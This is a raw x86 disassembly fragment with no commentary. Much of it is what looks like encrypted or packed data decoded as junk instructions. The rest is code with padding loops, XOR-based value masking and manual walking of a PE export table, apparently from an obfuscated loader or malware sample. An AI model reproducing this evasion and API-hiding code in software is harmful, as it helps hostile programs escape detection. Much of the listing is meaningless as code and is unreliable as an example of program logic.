  404902:	sahf   
  404903:	ror    BYTE PTR [ecx+eiz*4],0xc5
  404907:	(bad)  
  404908:	in     eax,dx
  404909:	mov    ds:0xcd05b4bf,eax
  40490e:	pop    esp
  40490f:	push   esp
  404910:	jno    0x40498e
  404912:	push   gs
  404914:	xor    esp,DWORD PTR [edx-0x70]
  404917:	loop   0x4048ac
  404919:	dec    esp
  40491a:	mov    bl,0x98
  40491c:	and    bh,ch
  40491e:	and    ch,BYTE PTR [esi-0x3b8b25e7]
  404924:	sbb    ch,dl
  404926:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404927:	pop    ds
  404928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404929:	je     0x404988
  40492b:	pop    esi
  40492c:	mov    BYTE PTR [ecx],al
  40492e:	jo     0x404989
  404930:	jae    0x404947
  404932:	fcmovne st,st(4)
  404934:	and    al,ch
  404936:	call   0xd078f5c6
  40493b:	add    eax,0x144355b3
  404940:	sbb    al,0x10
  404942:	pushf  
  404943:	inc    ebp
  404944:	add    bl,BYTE PTR [edi]
  404946:	int3   
  404947:	pop    eax
  404948:	jge    0x4049b0
  40494a:	es xor eax,0xc95eef
  404950:	(bad)  
  404951:	js     0x404913
  404953:	and    ecx,DWORD PTR [ebx]
  404955:	ffree  st(3)
  404957:	push   ebp
  404958:	push   cs
  404959:	in     al,0x2e
  40495b:	aas    
  40495c:	push   ebp
  40495d:	sbb    eax,0xcc6ed96a
  404962:	xor    cl,dh
  404964:	sub    DWORD PTR [ebp-0x26],0xffffffb3
  404968:	jo     0x404938
  40496a:	test   DWORD PTR [ebx],0x9b35513b
  404970:	ins    BYTE PTR es:[edi],dx
  404971:	push   ecx
  404972:	push   ebp
  404973:	dec    eax
  404974:	mov    dl,0x1b
  404976:	xchg   DWORD PTR [edi],ebx
  404978:	sub    eax,0x337fe3bd
  40497d:	in     eax,dx
  40497e:	cmp    al,bh
  404980:	jle    0x4049c5
  404982:	dec    esi
  404983:	xor    al,dh
  404985:	or     DWORD PTR [edi+0x5c17fb4f],ebx
  40498b:	jle    0x404976
  40498d:	add    al,0x22
  40498f:	or     eax,0x336f4406
  404994:	push   ds
  404995:	jnp    0x4049d2
  404997:	cmp    eax,DWORD PTR [eax-0x1]
  40499a:	ins    BYTE PTR es:[edi],dx
  40499b:	inc    esp
  40499c:	lods   al,BYTE PTR ds:[esi]
  40499d:	out    0xb7,al
  40499f:	out    0x70,eax
  4049a1:	add    dh,BYTE PTR [eax+0x1e]
  4049a4:	inc    eax
  4049a5:	mov    dh,0xc7
  4049a7:	into   
  4049a8:	adc    eax,0xc92a0f34
  4049ad:	test   BYTE PTR [ebx],0x69
  4049b0:	mov    ds:0x9463408d,al
  4049b5:	in     eax,dx
  4049b6:	mov    edi,0xcbdeb1e3
  4049bb:	pusha  
  4049bc:	xor    eax,0xf29a0133
  4049c1:	inc    ebp
  4049c2:	dec    eax
  4049c3:	ror    DWORD PTR [esi+0x34bcfa54],1
  4049c9:	in     al,dx
  4049ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049cb:	sub    esi,edi
  4049cd:	sbb    al,0xb
  4049cf:	fs pop eax
  4049d1:	(bad)  
  4049d2:	jae    0x4049e9
  4049d4:	mov    WORD PTR [edx+eiz*2+0x48],gs
  4049d8:	in     eax,0x75
  4049da:	jg     0x404a37
  4049dc:	sbb    edi,DWORD PTR [esi]
  4049de:	xchg   esi,eax
  4049df:	mov    bl,0x42
  4049e1:	fiadd  DWORD PTR [esi+0x8]
  4049e4:	lea    esp,[ecx]
  4049e6:	cmp    al,0xa0
  4049e8:	mov    esp,0x99e77be6
  4049ed:	pop    esp
  4049ee:	popf   
  4049ef:	shl    BYTE PTR [edx-0x7f],cl
  4049f2:	jbe    0x404975
  4049f4:	mov    cl,0xbb
  4049f6:	inc    eax
  4049f7:	leave  
  4049f8:	sub    al,BYTE PTR [ebx]
  4049fa:	sbb    edx,esp
  4049fc:	xchg   esp,eax
  4049fd:	pop    ecx
  4049fe:	jmp    0x6ba4:0xfc06a1ca
  404a05:	loopne 0x404a33
  404a07:	cdq    
  404a08:	stos   BYTE PTR es:[edi],al
  404a09:	cmp    ebp,DWORD PTR [edx+0x3a]
  404a0c:	mov    ecx,0xbf58e898
  404a11:	jns    0x4049e2
  404a13:	cmp    BYTE PTR [edi],bh
  404a15:	pusha  
  404a16:	outs   dx,DWORD PTR ds:[esi]
  404a17:	(bad)  
  404a18:	jmp    0xbe34:0x6e9e97fe
  404a1f:	call   0x2879:0x9ae6c0c1
  404a26:	jp     0x404a7d
  404a28:	and    BYTE PTR [edx-0x55],al
  404a2b:	push   esp
  404a2c:	in     al,0xc1
  404a2e:	adc    dl,BYTE PTR [edx+0x1a9a8706]
  404a34:	push   ebp
  404a35:	dec    esp
  404a36:	mov    esi,0x4788ae4c
  404a3b:	lahf   
  404a3c:	cmp    eax,0xaaa01e1d
  404a41:	sbb    al,0xa1
  404a43:	xchg   esi,eax
  404a44:	stc    
  404a45:	or     dh,BYTE PTR [esi]
  404a47:	aas    
  404a48:	mov    ds:0x599981a4,eax
  404a4d:	ds mov eax,0x4a39bc22
  404a53:	fmul   QWORD PTR [ebx]
  404a55:	mov    dl,0x83
  404a57:	and    BYTE PTR [ebx],ah
  404a59:	mov    eax,ds:0xb2a20167
  404a5e:	xchg   BYTE PTR [edx+eax*4],dh
  404a61:	sub    edx,ecx
  404a63:	dec    edx
  404a64:	xchg   ecx,eax
  404a65:	scas   eax,DWORD PTR es:[edi]
  404a66:	and    bh,BYTE PTR [ebx-0x7bcdd3b9]
  404a6c:	add    al,0x48
  404a6e:	dec    esi
  404a6f:	push   ebx
  404a70:	lahf   
  404a71:	inc    edi
  404a72:	ret    0xd73c
  404a75:	inc    esi
  404a76:	es in  eax,0xd1
  404a79:	cld    
  404a7a:	(bad)  
  404a7b:	mul    BYTE PTR [edx]
  404a7d:	xor    BYTE PTR [ecx-0x7d866f1],ch
  404a83:	pusha  
  404a84:	ror    esi,cl
  404a86:	icebp  
  404a87:	sub    ebp,DWORD PTR [eax-0x41]
  404a8a:	pop    edx
  404a8b:	data16 cld 
  404a8d:	xchg   edi,eax
  404a8e:	fidiv  DWORD PTR [ecx*8+0x4cd1ecc9]
  404a95:	pop    ebx
  404a96:	cmc    
  404a97:	gs or  edi,0xffffffdb
  404a9b:	inc    ebp
  404a9c:	nop    DWORD PTR [ecx-0x26]
  404aa0:	fnsave [eax]
  404aa2:	sbb    bh,BYTE PTR [ebp+0xd]
  404aa5:	xor    eax,0xd286ca3f
  404aaa:	ds pop edi
  404aac:	inc    esi
  404aad:	pop    ds
  404aae:	or     bh,BYTE PTR [edx]
  404ab0:	mov    bl,BYTE PTR [esi-0x1cc0b18b]
  404ab6:	mov    edx,0x9f177e66
  404abb:	inc    eax
  404abc:	add    al,BYTE PTR [ecx]
  404abe:	imul   BYTE PTR [eax-0xa248db7]
  404ac4:	push   0xd5480295
  404ac9:	fst    DWORD PTR [esp+eiz*2+0x5ee05bea]
  404ad0:	fs fs stos BYTE PTR es:[edi],al
  404ad3:	add    bl,BYTE PTR [edx-0x39]
  404ad6:	rcr    esi,cl
  404ad8:	pop    esp
  404ad9:	ja     0x404af9
  404adb:	inc    eax
  404adc:	push   eax
  404add:	mov    dl,BYTE PTR [ebp+0x56]
  404ae0:	imul   esi,esi,0x72417298
  404ae6:	mov    ebx,0x652ae176
  404aeb:	std    
  404aec:	mov    bh,0x14
  404aee:	inc    eax
  404aef:	repnz pusha 
  404af1:	dec    esi
  404af2:	push   0x25
  404af4:	and    al,0x8
  404af6:	js     0x404aaf
  404af8:	shr    DWORD PTR [ebx-0x57],cl
  404afb:	add    eax,0x68da72ee
  404b00:	push   ebp
  404b01:	mov    WORD PTR [esi-0x5f85fbb2],ds
  404b07:	imul   ecx,esi,0xffffff9f
  404b0a:	es (bad) 
  404b0c:	mov    ah,0x71
  404b0e:	fnsave [ebp-0x2dc2356e]
  404b14:	iret   
  404b15:	jl     0x404b2c
  404b17:	mov    ds:0xb375ee38,al
  404b1c:	sbb    al,0xfd
  404b1e:	sahf   
  404b1f:	add    al,0xfd
  404b21:	fdivr  QWORD PTR [esi-0x7b]
  404b24:	lods   al,BYTE PTR ds:[esi]
  404b25:	sub    DWORD PTR [eax-0x46f99fe6],ecx
  404b2b:	sbb    BYTE PTR [edx+ebp*8+0x4e],dl
  404b2f:	outs   dx,BYTE PTR ds:[esi]
  404b30:	js     0x404acf
  404b32:	push   0xffffffa2
  404b34:	pusha  
  404b35:	dec    edi
  404b36:	dec    edx
  404b37:	cmp    al,0x60
  404b39:	mov    ebx,0x36a2d070
  404b3e:	mov    esi,0x840c16c3
  404b43:	dec    eax
  404b44:	repz sub ecx,ebp
  404b47:	lods   eax,DWORD PTR ds:[esi]
  404b48:	and    eax,0x31f1e9a7
  404b4d:	sub    BYTE PTR ds:0x5e66a846,dh
  404b53:	dec    ebp
  404b54:	or     BYTE PTR [edx+edx*4-0x3a8ea022],ah
  404b5b:	xor    eax,ebp
  404b5d:	pop    eax
  404b5e:	shl    edx,0x6c
  404b61:	mov    ebx,0x6c0ebe0b
  404b66:	mov    al,ds:0x87ca084
  404b6b:	jb     0x404b42
  404b6d:	adc    BYTE PTR [edi],0x9b
  404b70:	and    al,0xaf
  404b72:	cmp    bh,BYTE PTR [eax-0x72ef6c4d]
  404b78:	mov    esp,0xb285617b
  404b7d:	popf   
  404b7e:	(bad)  
  404b7f:	into   
  404b80:	dec    ecx
  404b81:	(bad)  
  404b82:	mov    WORD PTR [ecx+0x5235157f],ds
  404b88:	pop    es
  404b89:	ror    DWORD PTR [esi-0x3e],cl
  404b8c:	ror    al,cl
  404b8e:	mov    ebp,0xdb41d330
  404b93:	mov    ds:0x505c73d5,al
  404b98:	pop    ebp
  404b99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b9a:	sub    eax,0x77040886
  404b9f:	je     0x404bc1
  404ba1:	and    esi,DWORD PTR [esi+esi*1+0x1291de30]
  404ba8:	mul    BYTE PTR [esi]
  404baa:	mov    eax,ds:0x7401e91
  404baf:	fnstsw WORD PTR [edi+0x30]
  404bb2:	push   ss
  404bb3:	push   0xabbea5e3
  404bb8:	(bad)  
  404bb9:	or     ch,al
  404bbb:	push   ebx
  404bbc:	inc    ecx
  404bbd:	out    0xa2,al
  404bbf:	push   ecx
  404bc0:	mov    ah,0x2e
  404bc2:	ret    
  404bc3:	fsubr  DWORD PTR [edi-0x2]
  404bc6:	xchg   esi,eax
  404bc7:	push   cs
  404bc8:	fwait
  404bc9:	retf   
  404bca:	jecxz  0x404bb6
  404bcc:	or     eax,0xefd86a59
  404bd1:	stos   BYTE PTR es:[edi],al
  404bd2:	jmp    0x404c04
  404bd4:	sub    cl,BYTE PTR es:[ecx+0x70e8675c]
  404bdb:	loopne 0x404b65
  404bdd:	das    
  404bde:	and    eax,0x8be62cfc
  404be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404be4:	mov    ch,BYTE PTR [esp+ecx*8-0x19]
  404be8:	mov    bh,0x80
  404bea:	std    
  404beb:	test   BYTE PTR [esi],cl
  404bed:	mov    ebp,0x92690436
  404bf2:	in     eax,0xa2
  404bf4:	cmp    BYTE PTR [ebx-0x3c],ah
  404bf7:	nop
  404bf8:	cmp    BYTE PTR [ecx],0x9a
  404bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bfc:	xchg   esi,eax
  404bfd:	mov    cl,0xde
  404bff:	bsf    esp,DWORD PTR [ecx+0x59fc45d1]
  404c06:	dec    edi
  404c07:	pop    eax
  404c08:	retf   0xb918
  404c0b:	aas    
  404c0c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  404c0e:	push   cs
  404c0f:	pop    DWORD PTR [edx]
  404c11:	sub    edi,edx
  404c13:	adc    BYTE PTR [esi-0x14b23b3f],dl
  404c19:	mov    ds,WORD PTR [ebx*1-0x3bb2d483]
  404c20:	mov    bl,dh
  404c22:	adc    DWORD PTR [ebp+0x7b9e8e2],ebx
  404c28:	es popf 
  404c2a:	loopne 0x404bf6
  404c2c:	jo     0x404bcd
  404c2e:	loopne 0x404bce
  404c30:	and    ch,dh
  404c32:	(bad)  
  404c33:	pop    ebp
  404c34:	jl     0x404bde
  404c36:	xor    BYTE PTR [ecx],dl
  404c38:	dec    esi
  404c39:	clc    
  404c3a:	jg     0x404bbd
  404c3c:	add    DWORD PTR [ebx-0x1e2b5c8e],eax
  404c42:	enter  0xee67,0x36
  404c46:	pop    eax
  404c47:	fldcw  WORD PTR [edx]
  404c49:	inc    ebx
  404c4a:	fld    TBYTE PTR [edi+0x49]
  404c4d:	aaa    
  404c4e:	sub    al,dh
  404c50:	push   ebp
  404c51:	cdq    
  404c52:	cwde   
  404c53:	xchg   edi,eax
  404c54:	jge    0x404c96
  404c56:	iret   
  404c57:	sub    eax,ebx
  404c59:	aas    
  404c5a:	out    0xd3,al
  404c5c:	les    eax,FWORD PTR [ecx+0x66]
  404c5f:	psubd  mm2,QWORD PTR [ebp+0x32]
  404c63:	inc    eax
  404c64:	ret    
  404c65:	or     esi,DWORD PTR ds:0x642025a1
  404c6b:	iret   
  404c6c:	or     BYTE PTR [ecx],dh
  404c6e:	xchg   ebx,eax
  404c6f:	adc    dl,dl
  404c71:	test   BYTE PTR [ebp+0xc77799f],ch
  404c77:	(bad)  
  404c78:	sub    eax,0x337081ac
  404c7d:	jnp    0x404c24
  404c7f:	pop    edx
  404c80:	mov    esp,ss
  404c82:	pop    ebx
  404c83:	mov    ebp,0xde293044
  404c88:	arpl   WORD PTR [ecx],cx
  404c8a:	stc    
  404c8b:	xor    DWORD PTR [ebx-0x21871d81],esp
  404c91:	xlat   BYTE PTR ds:[ebx]
  404c92:	imul   eax,DWORD PTR [ebp-0x202bcbca],0xd
  404c99:	sub    BYTE PTR [ebp+0x6778eb6f],bl
  404c9f:	retf   
  404ca0:	add    DWORD PTR [ebp+0x69b6ed4],esi
  404ca6:	or     DWORD PTR [edx+0x4a],edi
  404ca9:	or     ebp,eax
  404cab:	ror    BYTE PTR [ebx+ebx*1],cl
  404cae:	cs jle 0x404d1c
  404cb1:	dec    ax
  404cb3:	cld    
  404cb4:	mov    ebp,0xd5d72fad
  404cb9:	sar    DWORD PTR ds:0x9e8e4569,0x2b
  404cc0:	xchg   edi,eax
  404cc1:	ficom  DWORD PTR [ecx-0x35]
  404cc4:	dec    edx
  404cc5:	sub    al,0xc2
  404cc7:	je     0x404c55
  404cc9:	inc    ecx
  404cca:	jmp    0x4791:0xc9ca07d4
  404cd1:	in     eax,dx
  404cd2:	pop    ebx
  404cd3:	(bad)  
  404cd4:	popa   
  404cd5:	repz dec edi
  404cd7:	xor    ah,dh
  404cd9:	or     DWORD PTR [edi+0x6e],ebp
  404cdc:	pop    ss
  404cdd:	mov    edi,0xb57e725c
  404ce2:	sub    DWORD PTR [ebp-0x713dc9e2],0x73
  404ce9:	inc    eax
  404cea:	jnp    0x404d11
  404cec:	push   esi
  404ced:	mov    al,0xc1
  404cef:	mov    DWORD PTR [esp],eax
  404cf2:	(bad)  
  404cf3:	dec    ecx
  404cf4:	icebp  
  404cf5:	dec    ebx
  404cf6:	jle    0x404d66
  404cf8:	into   
  404cf9:	call   0xed3c3488
  404cfe:	mov    bh,bh
  404d00:	push   edi
  404d01:	jmp    0x6204:0x8fff375a
  404d08:	and    ecx,DWORD PTR [ecx-0x357a515c]
  404d0e:	xor    al,BYTE PTR [esi+0x44]
  404d11:	lods   eax,DWORD PTR ds:[esi]
  404d12:	inc    ecx
  404d13:	inc    ebp
  404d14:	pop    ebp
  404d15:	xchg   edi,eax
  404d16:	fcom   QWORD PTR [eax-0x752d09c4]
  404d1c:	jo     0x404d6d
  404d1e:	pop    ebx
  404d1f:	adc    BYTE PTR [ecx],cl
  404d21:	mov    al,0xb4
  404d23:	dec    ebx
  404d24:	(bad)  [edx]
  404d26:	xchg   edi,eax
  404d27:	data16 jmp 0x404d62
  404d2a:	and    al,0x46
  404d2c:	lock cmp BYTE PTR [ebp+edx*1-0x4e4a0d1e],ch
  404d34:	adc    al,0x6
  404d36:	ret    
  404d37:	inc    esp
  404d38:	and    al,0xce
  404d3a:	gs xor ebp,ebx
  404d3d:	arpl   WORD PTR [esi+esi*4],dx
  404d40:	je     0x404d87
  404d42:	leave  
  404d43:	mov    eax,ds:0xf6bbcb26
  404d48:	(bad)  
  404d49:	ja     0x404d2f
  404d4b:	icebp  
  404d4c:	dec    ebp
  404d4d:	mov    al,0x35
  404d4f:	xor    al,0x25
  404d51:	cli    
  404d52:	jmp    0x17dd:0x1c71f18e
  404d59:	and    BYTE PTR [eax+0x38294ac2],0x1a
  404d60:	data16 and BYTE PTR [esi+0x6d],al
  404d64:	push   esi
  404d65:	mov    ebx,0x69e3df9f
  404d6a:	aam    0xb0
  404d6c:	lock xchg edi,eax
  404d6e:	xchg   esp,eax
  404d6f:	mov    dh,0xe1
  404d71:	jns    0x404dce
  404d73:	int3   
  404d74:	sahf   
  404d75:	jo     0x404d1d
  404d77:	ret    
  404d78:	mov    cl,0x22
  404d7a:	fiadd  DWORD PTR [edx+0x20]
  404d7d:	push   edi
  404d7e:	dec    esi
  404d7f:	mov    ch,0x3f
  404d81:	cmc    
  404d82:	jl     0x404d2c
  404d84:	jb     0x404d54
  404d86:	call   0x691bd460
  404d8b:	iret   
  404d8c:	xchg   esp,eax
  404d8d:	rcr    DWORD PTR [esi+0x14],cl
  404d90:	add    eax,0x13a37b26
  404d95:	add    eax,0xe0cc556c
  404d9a:	xchg   esi,eax
  404d9b:	mov    ecx,0x4df42ee8
  404da0:	push   edi
  404da1:	add    bh,BYTE PTR ds:0x6e2d74dd
  404da7:	jb     0x404d9e
  404da9:	jnp    0x404d97
  404dab:	aam    0x81
  404dad:	dec    esi
  404dae:	sbb    DWORD PTR [edi-0x44],esp
  404db1:	js     0x404d97
  404db3:	add    eax,0x1f185dc8
  404db8:	scas   al,BYTE PTR es:[edi]
  404db9:	sbb    dh,bh
  404dbb:	push   esi
  404dbc:	mov    ebp,0x795c581c
  404dc1:	pushf  
  404dc2:	aas    
  404dc3:	inc    esi
  404dc4:	enter  0xdcb2,0xdb
  404dc8:	xor    dl,dh
  404dca:	(bad)  
  404dcb:	int3   
  404dcc:	mov    cl,bl
  404dce:	xchg   DWORD PTR [eax],eax
  404dd0:	popa   
  404dd1:	jns    0x404e26
  404dd3:	sbb    DWORD PTR [ebx+ebx*4],ebx
  404dd6:	mov    eax,0x52784bcb
  404ddb:	xchg   ebp,eax
  404ddc:	jbe    0x404de2
  404dde:	sahf   
  404ddf:	cwde   
  404de0:	loop   0x404d90
  404de2:	out    0x2f,eax
  404de4:	das    
  404de5:	sahf   
  404de6:	test   eax,ecx
  404de8:	sar    BYTE PTR [edx+0x6728d425],0x5e
  404def:	stos   DWORD PTR es:[edi],eax
  404df0:	(bad)  
  404df1:	xor    dl,BYTE PTR [eax]
  404df3:	ja     0x404e41
  404df5:	and    eax,0x840f6523
  404dfa:	fadd   DWORD PTR [eax]
  404dfc:	add    BYTE PTR [eax],al
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
